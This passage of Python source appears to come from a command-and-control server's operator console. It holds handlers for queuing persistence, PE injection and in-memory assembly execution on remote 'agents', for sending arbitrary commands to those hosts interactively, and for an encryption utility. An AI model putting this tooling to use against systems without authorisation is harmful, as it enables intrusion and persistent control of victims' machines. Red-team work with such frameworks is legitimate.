            # Parse command arguments - handle both positional and key-value format
            if '=' in command_parts[1] and 'agent_id=' in command_parts[1]:
                # Handle format like: inline-execute-assembly agent_id=abc-123-def assembly_path
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                # Handle format: inline-execute-assembly assembly_path [agent_id=value]
                assembly_path = command_parts[1]
                options['assembly_path'] = assembly_path

                # Look for agent_id in remaining arguments
                for part in command_parts[2:]:
                    if '=' in part and part.startswith('agent_id='):
                        key, value = part.split('=', 1)
                        options['agent_id'] = value

            # If in interactive mode and no agent_id specified, use the current agent
            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            # Validate that we have an agent_id
            if 'agent_id' not in options:
                return "No agent_id specified and not in interactive mode", 'error'

            agent_id = options['agent_id']
            if session.agent_manager.is_agent_locked_interactively(agent_id):
                lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                if lock_info and lock_info['operator'] != session.username:
                    return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))

                                    # Return both the output and task ID if available (like pinject)
                                    if 'task_id' in result:
                                        return f"{output} (Task ID: {result['task_id']})", status
                                    else:
                                        return output, status
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')
                                    return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))

                                # Return both the output and task ID if available (like pinject)
                                if 'task_id' in result:
                                    return f"{output} (Task ID: {result['task_id']})", status
                                else:
                                    return output, status
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')
                                return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running inline-execute-assembly: {str(e)}", 'error'

    def handle_persist_command(self, command_parts, session):
        module_name = "persist"

        if len(command_parts) < 2:
            return "USAGE: persist <method> <payload_path> [agent_id=<agent_id>] [name=<persistence_name>] [interval=<minutes>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

            if '=' in command_parts[1]:
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                method = command_parts[1]
                options['method'] = method

                if len(command_parts) > 2:
                    payload_path = command_parts[2]
                    options['payload_path'] = payload_path

                for part in command_parts[3:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value

            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            wait_timeout = int(options.get('wait_timeout', 0))

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    agent_id = options.get('agent_id')
                    if agent_id:
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')

                                if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                    task_id = result['task_id']
                                    agent_id = options.get('agent_id')
                                    if not agent_id:
                                        return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                    import time
                                    start_time = time.time()
                                    while time.time() - start_time < wait_timeout:
                                        task_data = db.execute(
                                            "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                            (task_id, agent_id)
                                        ).fetchone()
                                        if task_data and task_data['status'] == 'completed':
                                            return f"Task {task_id} completed: {task_data['result']}", 'success'
                                        time.sleep(1)

                                    return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                                return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')

                            if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                task_id = result['task_id']
                                agent_id = options.get('agent_id')
                                if not agent_id:
                                    return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                import time
                                start_time = time.time()
                                while time.time() - start_time < wait_timeout:
                                    task_data = db.execute(
                                        "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                        (task_id, agent_id)
                                    ).fetchone()
                                    if task_data and task_data['status'] == 'completed':
                                        return f"Task {task_id} completed: {task_data['result']}", 'success'
                                    time.sleep(1)

                                return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                            return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running persist: {str(e)}", 'error'

    def handle_peinject_command(self, command_parts, session):
        module_name = "peinject"

        if len(command_parts) < 2:
            return "USAGE: peinject <pe_file> [agent_id=<agent_id>]", 'error'

        try:
            db = session.agent_manager.db if session.agent_manager else self.db
            module_manager = self.module_manager

            options = {}

            if '=' in command_parts[1]:
                for part in command_parts[1:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value
            else:
                pe_file_input = command_parts[1]
                options['pe_file'] = pe_file_input

                for part in command_parts[2:]:
                    if '=' in part:
                        key, value = part.split('=', 1)
                        options[key] = value

            if session.interactive_mode and session.current_agent and 'agent_id' not in options:
                options['agent_id'] = session.current_agent

            wait_timeout = int(options.get('wait_timeout', 0))

            module_manager.load_all_modules()
            module_manager.load_modules_from_db()

            loaded_modules_dict = getattr(module_manager, 'loaded_modules', {})

            if module_name not in loaded_modules_dict:
                import importlib.util
                module_path = os.path.join("modules", f"{module_name}.py")
                if os.path.exists(module_path):
                    spec = importlib.util.spec_from_file_location(module_name, module_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'get_info'):
                        module_info = module.get_info()
                    else:
                        module_info = {}

                    loaded_modules_dict[module_name] = {
                        'module': module,
                        'info': module_info,
                        'path': module_path
                    }
                else:
                    return f"Module not found: {module_name}", 'error'

            if module_name in loaded_modules_dict:
                module_data = loaded_modules_dict[module_name]
                module = module_data['module']
                info = module_data.get('info', {})

                if hasattr(module, 'execute'):
                    required_options = [opt for opt, opt_info in info.get('options', {}).items() if opt_info.get('required', False)]
                    missing = [opt for opt in required_options if opt not in options]
                    if missing:
                        return f"Missing required options: {', '.join(missing)}", 'error'

                    agent_id = options.get('agent_id')
                    if agent_id:
                        if session.agent_manager.is_agent_locked_interactively(agent_id):
                            lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                            if lock_info and lock_info['operator'] != session.username:
                                return f"Agent {agent_id} is currently in exclusive interactive mode with operator: {lock_info['operator']}. Access denied.", 'error'

                    original_agent = session.current_agent
                    try:
                        # Check if we're in interactive mode and if the module should be executed interactively
                        if session.interactive_mode and session.current_agent and agent_id == session.current_agent:
                            # Temporarily set a flag to indicate this is for interactive execution
                            session.is_interactive_execution = True

                            result = module.execute(options, session)

                            # Remove the flag after execution
                            if hasattr(session, 'is_interactive_execution'):
                                delattr(session, 'is_interactive_execution')

                            if 'success' in result and result['success'] and 'command' in result:
                                # This is a command that should be executed interactively
                                command_to_execute = result['command']

                                # Execute the command via the interactive API instead of queuing it
                                interactive_result, error = session.agent_manager.send_interactive_command(
                                    session.current_agent, command_to_execute, timeout=120
                                )

                                if error:
                                    return f"Error executing interactive command: {error}", 'error'

                                if interactive_result is not None:
                                    formatted_result = str(interactive_result).strip()
                                    if len(formatted_result) > 10000:  # Truncate very long results
                                        formatted_result = formatted_result[:10000] + "\n... (truncated)"

                                    return f"[+] Interactive module execution completed:\n{formatted_result}", 'success'
                                else:
                                    return "No response from agent", 'warning'
                            else:
                                # If the module doesn't return a command to execute, use the original result
                                if 'success' in result:
                                    status = 'success' if result['success'] else 'error'
                                    output = result.get('output', result.get('error', 'Unknown error'))
                                else:
                                    output = result.get('output', 'No output')
                                    status = result.get('status', 'unknown')

                                if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                    task_id = result['task_id']
                                    agent_id = options.get('agent_id')
                                    if not agent_id:
                                        return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                    import time
                                    start_time = time.time()
                                    while time.time() - start_time < wait_timeout:
                                        task_data = db.execute(
                                            "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                            (task_id, agent_id)
                                        ).fetchone()
                                        if task_data and task_data['status'] == 'completed':
                                            return f"Task {task_id} completed: {task_data['result']}", 'success'
                                        time.sleep(1)

                                    return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                                return output, status
                        else:
                            # Normal execution (not in interactive mode)
                            result = module.execute(options, session)
                            if 'success' in result:
                                status = 'success' if result['success'] else 'error'
                                output = result.get('output', result.get('error', 'Unknown error'))
                            else:
                                output = result.get('output', 'No output')
                                status = result.get('status', 'unknown')

                            if status == 'success' and wait_timeout > 0 and 'task_id' in result:
                                task_id = result['task_id']
                                agent_id = options.get('agent_id')
                                if not agent_id:
                                    return f"Task {task_id} queued, but cannot monitor without agent_id", 'error'

                                import time
                                start_time = time.time()
                                while time.time() - start_time < wait_timeout:
                                    task_data = db.execute(
                                        "SELECT status, result FROM agent_tasks WHERE id = ? AND agent_id = ?",
                                        (task_id, agent_id)
                                    ).fetchone()
                                    if task_data and task_data['status'] == 'completed':
                                        return f"Task {task_id} completed: {task_data['result']}", 'success'
                                    time.sleep(1)

                                return f"Task {task_id} queued but not completed within {wait_timeout} seconds (status: {task_data['status'] if task_data else 'unknown'})", 'warning'

                            return output, status
                    finally:
                        session.current_agent = original_agent
                else:
                    return f"Module '{module_name}' does not have an execute function", 'error'
            else:
                return f"Could not load module: {module_name}", 'error'

        except Exception as e:
            return f"Error running peinject: {str(e)}", 'error'

    def handle_agent_command(self, command_parts, session):
        if len(command_parts) < 2:
            return help.get_agent_help_display(), 'info'
        
        action = command_parts[1].lower()
        
        if action == 'list':
            try:
                agent_manager = session.agent_manager
                if not agent_manager:
                    return "Agent manager not initialized", 'error'

                agents = agent_manager.list_agents()
                if not agents:
                    return "No active agents found.", 'info'

                output = "Active Agents:\n"
                output += "-" * 150 + "\n"
                output += f"{'ID':<30} {'IP Address':<15} {'Hostname':<20} {'OS':<15} {'User':<15} {'Listener ID':<15} {'Status':<12} {'Last Seen':<19}\n"
                output += "-" * 150 + "\n"

                for agent in agents:
                    agent_id = agent['id']
                    ip_address = agent['ip_address']
                    hostname = agent['hostname']
                    os_info = agent['os_info'][:14] if agent['os_info'] else 'N/A'  # Truncate if too long
                    user = agent['user']
                    listener_id = agent['listener_id']
                    status = agent['status']
                    last_seen = agent['last_seen'][:19] if agent['last_seen'] else 'N/A'  # Truncate timestamp

                    output += f"{agent_id:<30} {ip_address:<15} {hostname:<20} {os_info:<15} {user:<15} {listener_id:<15} {status:<12} {last_seen:<19}\n"

                return output, 'success'

            except Exception as e:
                return f"Error listing agents: {str(e)}", 'error'
        
        elif action == 'interact':
            if len(command_parts) < 3:
                return "Usage: agent interact <agent_id>", 'error'
        
            agent_id = command_parts[2]
        
            try:
                agent_manager = session.agent_manager
                if not agent_manager:
                    return "Agent manager not initialized", 'error'
            
                agent = agent_manager.get_agent(agent_id)
                if not agent:
                    return f"Agent {agent_id} not found", 'error'
            
                session_id = getattr(session, 'session_id', 'unknown')
                lock_result = agent_manager.try_acquire_interactive_lock(agent_id, session.username, session_id)
                if not lock_result['success']:
                    return lock_result.get('error', f"Failed to acquire interactive lock for agent {agent_id}"), 'error'

                session.current_agent = agent_id
                session.interactive_mode = True
                for sess_id, sess_info in self.active_sessions.items():
                    if sess_info.get('user_id') == session.user_id and sess_info.get('username') == session.username:
                        sess_info['current_agent'] = agent_id
                        sess_info['interactive_mode'] = True
                        break
            
                output = f"\n{'=' * 80}\n"
                output += f" INTERACTIVE MODE ACTIVATED (EXCLUSIVE ACCESS)\n"
                output += f"Agent: {agent_id}\n"
                output += f"Hostname: {agent.hostname} | User: {agent.user} | OS: {agent.os_info}\n"
                output += f"{'=' * 80}\n"
                output += " Commands are executed in REAL-TIME via interactive API\n"
                output += " Type 'back' to leave interactive mode\n"
                output += " All commands go directly to agent, bypassing task queue\n"
                output += " Exclusive access - other operators locked out\n"
                output += f"{'=' * 80}\n"
            
                return output, 'interactive'
                
            except Exception as e:
                if session.agent_manager:
                    session.agent_manager.release_interactive_lock(agent_id)
                return f"Error entering interactive mode: {str(e)}", 'error'
        
        elif action == 'execute':
            if not session.current_agent:
                return "No agent selected. Use 'agent interact <agent_id>' first.", 'error'
            
            if len(command_parts) < 3:
                return "Usage: agent execute <command>", 'error'
            
            command = ' '.join(command_parts[2:])
            
            try:
                agent_manager = session.agent_manager
                if not agent_manager:
                    return "Agent manager not initialized", 'error'
                
                task_id = agent_manager.add_task(session.current_agent, command)
                if task_id:
                    return f"Task {task_id} queued for agent {session.current_agent}", 'success'
                else:
                    return f"Failed to queue task for agent {session.current_agent}", 'error'
                    
            except Exception as e:
                return f"Error executing command: {str(e)}", 'error'
        
        elif action == 'info':
            if len(command_parts) < 3:
                return "Usage: agent info <agent_id>", 'error'
            
            agent_id = command_parts[2]
            
            try:
                agent_manager = self.agent_manager  # Use instance's agent manager
                
                agent = agent_manager.get_agent(agent_id)
                if not agent:
                    return f"Agent {agent_id} not found", 'error'
                
                agent_dict = agent.to_dict()
                
                output = f"\nAgent Information:\n"
                output += "=" * 80 + "\n"
                output += f"ID: {agent_dict['id']}\n"
                output += f"IP Address: {agent_dict['ip_address']}\n"
                output += f"Hostname: {agent_dict['hostname']}\n"
                output += f"OS: {agent_dict['os_info']}\n"
                output += f"User: {agent_dict['user']}\n"
                output += f"Listener ID: {agent_dict['listener_id']}\n"
                output += f"First Seen: {agent_dict['first_seen']}\n"
                output += f"Last Seen: {agent_dict['last_seen']}\n"
                output += f"Status: {agent_dict['status']}\n"
                output += f"Pending Tasks: {agent_dict['pending_tasks']}\n"
                output += f"Interactive Mode: {'Active' if agent_dict.get('interactive_mode') else 'Inactive'}\n"
                
                if session.agent_manager.is_agent_locked_interactively(agent_id):
                    lock_info = session.agent_manager.get_interactive_lock_info(agent_id)
                    if lock_info:
                        output += f"Interactive Lock: EXCLUSIVE - Held by operator: {lock_info['operator']}\n"
                    else:
                        output += f"Interactive Lock: EXCLUSIVE - Locked\n"
                else:
                    output += f"Interactive Lock: Available for access\n"
                output += "=" * 80 + "\n"
                
                return output, 'success'
                
            except Exception as e:
                return f"Error getting agent info: {str(e)}", 'error'
        
        elif action == 'kill':
            if len(command_parts) < 3:
                return "Usage: agent kill <agent_id>", 'error'
            
            agent_id = command_parts[2]
            
            try:
                agent_manager = self.agent_manager  # Use instance's agent manager
                
                result = agent_manager.add_task(agent_id, 'kill')
                if result and result.get('success'):
                    task_id = result['task_id']
                    print(f"[+] Kill command sent to agent {agent_id} (Task ID: {task_id})")
                else:
                    print(f"[-] Failed to send kill command to agent {agent_id}")
                    if result:
                        print(f"Error: {result.get('error', 'Unknown error')}")
                
                import time
                time.sleep(2)  # Allow time for the agent to process the kill command
                
                if agent_manager.remove_agent(agent_id):
                    if session.current_agent == agent_id:
                        session.current_agent = None
                        session.interactive_mode = False
                    
                    return f"Agent {agent_id} has been removed from the system", 'success'
                else:
                    return f"Failed to remove agent {agent_id} from the system", 'error'
                    
            except Exception as e:
                return f"Error killing agent: {str(e)}", 'error'
        
        elif action == 'monitor':
            if len(command_parts) < 3:
                return "Usage: agent monitor <agent_id>", 'error'
            agent_id = command_parts[2]
            
            try:
                if self.multiplayer_coordinator:
                    success = self.multiplayer_coordinator.add_agent_monitor(
                        session.session_id if hasattr(session, 'session_id') else 'unknown',
                        agent_id,
                        session.username if hasattr(session, 'username') else 'unknown'
                    )
                    if success:
                        return f"Started monitoring agent: {agent_id}", 'success'
                    else:
                        return f"Failed to start monitoring agent: {agent_id}", 'error'
                else:
                    return "Multiplayer coordinator not available", 'error'
            except Exception as e:
                return f"Error monitoring agent: {str(e)}", 'error'
        
        elif action == 'unmonitor':
            if len(command_parts) < 3:
                return "Usage: agent unmonitor <agent_id>", 'error'
            agent_id = command_parts[2]
            
            try:
                if self.multiplayer_coordinator:
                    success = self.multiplayer_coordinator.remove_agent_monitor(
                        session.session_id if hasattr(session, 'session_id') else 'unknown',
                        agent_id
                    )
                    if success:
                        return f"Stopped monitoring agent: {agent_id}", 'success'
                    else:
                        return f"Failed to stop monitoring agent: {agent_id}", 'error'
                else:
                    return "Multiplayer coordinator not available", 'error'
            except Exception as e:
                return f"Error unmonitoring agent: {str(e)}", 'error'
        
        else:
            return f"Unknown agent action: {action}. Use: list, interact, execute, info, kill, monitor, unmonitor", 'error'

    def handle_interactive_command(self, command, session):
        try:
            if not session.agent_manager:
                return "Agent manager not initialized", 'error'
            
            if command.strip().lower() in ['exit', 'back', 'quit']:
                if session.current_agent:
                    agent_manager = session.agent_manager
                    agent_manager.exit_interactive_mode(session.current_agent)
                    
                    agent_id = session.current_agent
                    session.current_agent = None
                    session.interactive_mode = False
                    for sess_id, sess_info in self.active_sessions.items():
                        if sess_info.get('current_agent') == agent_id:
                            sess_info['current_agent'] = None
                            sess_info['interactive_mode'] = False
                    return f"\nExited interactive mode with agent {agent_id}\n", 'success'
                else:
                    return "Not in interactive mode", 'error'
            
            agent = session.agent_manager.get_agent(session.current_agent)
            if not agent:
                session.agent_manager.release_interactive_lock(session.current_agent)
                
                session.current_agent = None
                session.interactive_mode = False
                for sess_id, sess_info in self.active_sessions.items():
                    if sess_info.get('current_agent') == session.current_agent:
                        sess_info['current_agent'] = None
                        sess_info['interactive_mode'] = False
                return f"Agent {session.current_agent} no longer exists. Exiting interactive mode.", 'error'
            
            print(f"[*] Sending interactive command to agent {session.current_agent}: {command}")
            result, error = session.agent_manager.send_interactive_command(session.current_agent, command, timeout=120)  # Increased timeout
            
            if error:
                return f"Error: {error}", 'error'
            
            if result is not None:
                formatted_result = str(result).strip()
                if len(formatted_result) > 10000:  # Truncate very long results
                    formatted_result = formatted_result[:10000] + "\n... (truncated - use 'result' command to see full output)"
                
                output = f"\n[Agent Response]\n{'=' * 80}\n{formatted_result}\n{'=' * 80}\n"
                return output, 'success'
            else:
                return "No response from agent", 'warning'
            
        except Exception as e:
            return f"Error executing interactive command: {str(e)}", 'error'


    def get_encryption_manager(self):
        return self._encryption_manager

    def handle_encryption_command(self, command_parts, session):

        if not command_parts:
            return help.get_encryption_help(), 'info'
        
        if len(command_parts) < 2:
            return help.get_encryption_help(), 'info'
        
        if command_parts[0].lower() == 'encryption':
            command_parts = command_parts[1:]
        
        if not command_parts:
            return help.get_encryption_help(), 'info'
        
        action = command_parts[0].lower()
        
        if action == 'encrypt':
            return self.handle_encrypt(command_parts)
        elif action == 'decrypt':
            return self.handle_decrypt(command_parts)
        elif action == 'keygen':
            return self.handle_keygen(command_parts)
        elif action == 'stego':
            return self.handle_steganography(command_parts)
        elif action == 'hmac':
            return self.handle_hmac(command_parts)
        elif action == 'list':
            return self.handle_list(command_parts)
        elif action == 'help':
            return help.get_encryption_help(), 'info'
        else:
            return f"Unknown action: {action}. Use 'encryption help' for available commands.", 'error'

    def handle_encrypt(self, command_parts):
        if len(command_parts) < 3:
            return """
    USAGE:
        encryption encrypt <algorithm> <data> [options]

    ALGORITHMS:
        fernet    - Symmetric encryption (default)
        aes       - AES encryption (requires password=<pwd>)
        rsa       - RSA encryption (requires public_key=<path>)
        xor       - XOR encryption (requires key=<key>)

    OPTIONS:
        password=<pwd>      - Password for AES
        public_key=<path>   - Path to RSA public key file
        key=<key>           - Key for XOR (hex string)
        output=<path>       - Save encrypted data to file

    EXAMPLES:
        encryption encrypt fernet "Hello World"
        encryption encrypt aes "Secret Data" password=mypass123
        encryption encrypt xor "Data" key=deadbeef output=out.enc
            """, 'error'
        
        algorithm = command_parts[1].lower()
        data = command_parts[2]
        
        options = {}
        for part in command_parts[3:]:
            if '=' in part:
                key, value = part.split('=', 1)
                options[key.lower()] = value
        
        try:
            encryption_manager = self.get_encryption_manager()
            encrypted_data = None
            metadata = {}
            
            if algorithm == 'fernet':
                encrypted_data = encryption_manager.encrypt_data(data)
                encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
                
            elif algorithm == 'aes':
                if 'password' not in options:
                    return "AES encryption requires password=<pwd> option", 'error'
                
                password = options['password']
                key, salt = encryption_manager.generate_aes_key(password)
                encrypted_data = encryption_manager.encrypt_aes(data, key)
                
                metadata['salt'] = base64.b64encode(salt).decode('utf-8')
                encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
                
            elif algorithm == 'rsa':
                if 'public_key' not in options:
                    return "RSA encryption requires public_key=<path> option", 'error'
                
                pub_key_path = options['public_key']
                if not os.path.exists(pub_key_path):
                    return f"Public key file not found: {pub_key_path}", 'error'
                
                with open(pub_key_path, 'rb') as f:
                    public_key = f.read()
                
                encrypted_data = encryption_manager.encrypt_rsa(data.encode('utf-8'), public_key)
                encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
                
            elif algorithm == 'xor':
                if 'key' not in options:
                    return "XOR encryption requires key=<key> option (hex string)", 'error'
                
                try:
                    xor_key = bytes.fromhex(options['key'])
                except ValueError:
                    return "Invalid XOR key. Must be hex string (e.g., deadbeef)", 'error'
                
                encrypted_data = encryption_manager.xor_encrypt(data, xor_key)
                encrypted_b64 = base64.b64encode(encrypted_data).decode('utf-8')
                
            else:
                return f"Unknown encryption algorithm: {algorithm}", 'error'
            
            if 'output' in options:
                output_path = options['output']
                with open(output_path, 'w') as f:
                    f.write(f"Algorithm: {algorithm}\n")
                    for key, value in metadata.items():
                        f.write(f"{key}: {value}\n")
                    f.write(f"Data: {encrypted_b64}\n")
                return f"Encrypted data saved to: {output_path}", 'success'
            else:
                output = f"Encryption successful!\n"
                output += f"Algorithm: {algorithm}\n"
                for key, value in metadata.items():
                    output += f"{key}: {value}\n"
                output += f"Encrypted Data (base64):\n{encrypted_b64}"
                return output, 'success'
                
        except Exception as e:
            return f"Encryption error: {str(e)}", 'error'

    def handle_decrypt(self, command_parts):
        if len(command_parts) < 3:
            return """
    USAGE:
        encryption decrypt <algorithm> <encrypted_data> [options]

    ALGORITHMS:
        fernet    - Symmetric decryption
        aes       - AES decryption (requires password=<pwd> salt=<salt>)
        rsa       - RSA decryption (requires private_key=<path>)
        xor       - XOR decryption (requires key=<key>)

    OPTIONS:
        password=<pwd>      - Password for AES
        salt=<salt>         - Salt for AES (base64)
        private_key=<path>  - Path to RSA private key file
        key=<key>           - Key for XOR (hex string)
        input=<path>        - Read encrypted data from file

    EXAMPLES:
        encryption decrypt fernet <base64_data>
        encryption decrypt aes <data> password=mypass123 salt=<salt>
        encryption decrypt xor <data> key=deadbeef
            """, 'error'
        
        algorithm = command_parts[1].lower()
        encrypted_data_b64 = command_parts[2] if len(command_parts) > 2 else None
        
        options = {}
        for part in command_parts[3:]:
            if '=' in part:
                key, value = part.split('=', 1)
                options[key.lower()] = value
        
        try:
            encryption_manager = self.get_encryption_manager()
            
            if 'input' in options:
                input_path = options['input']
                if not os.path.exists(input_path):
                    return f"Input file not found: {input_path}", 'error'
                
                with open(input_path, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if line.startswith('Data:'):
                            encrypted_data_b64 = line.split(':', 1)[1].strip()
                        elif line.startswith('salt:'):
                            options['salt'] = line.split(':', 1)[1].strip()
            
            if not encrypted_data_b64:
                return "No encrypted data provided", 'error'
            
            try:
                encrypted_data = base64.b64decode(encrypted_data_b64)
            except Exception:
                return "Invalid base64 encoded data", 'error'
            
            decrypted_data = None
            
            if algorithm == 'fernet':
                decrypted_data = encryption_manager.decrypt_data(encrypted_data)
                
            elif algorithm == 'aes':
                if 'password' not in options or 'salt' not in options:
                    return "AES decryption requires password=<pwd> and salt=<salt> options", 'error'
                
                password = options['password']
                salt = base64.b64decode(options['salt'])
                
                key, _ = encryption_manager.generate_aes_key(password, salt)
                decrypted_data = encryption_manager.decrypt_aes(encrypted_data, key).decode('utf-8')
                
            elif algorithm == 'rsa':
                if 'private_key' not in options:
                    return "RSA decryption requires private_key=<path> option", 'error'
                
                priv_key_path = options['private_key']
                if not os.path.exists(priv_key_path):
                    return f"Private key file not found: {priv_key_path}", 'error'
                
                with open(priv_key_path, 'rb') as f:
                    private_key = f.read()
                
                decrypted_data = encryption_manager.decrypt_rsa(encrypted_data, private_key).decode('utf-8')
                
            elif algorithm == 'xor':
                if 'key' not in options:
                    return "XOR decryption requires key=<key> option (hex string)", 'error'
                
                try:
                    xor_key = bytes.fromhex(options['key'])
                except ValueError:
                    return "Invalid XOR key. Must be hex string", 'error'
                
                decrypted_data = encryption_manager.xor_decrypt(encrypted_data, xor_key).decode('utf-8')
                
            else:
                return f"Unknown decryption algorithm: {algorithm}", 'error'
            
            return f"Decryption successful!\nDecrypted Data:\n{decrypted_data}", 'success'
            
        except Exception as e:
            return f"Decryption error: {str(e)}", 'error'

    def handle_keygen(self, command_parts):
        if len(command_parts) < 2:
            return """
    USAGE:
        encryption keygen <algorithm> [options]

    ALGORITHMS:
        fernet    - Generate Fernet key
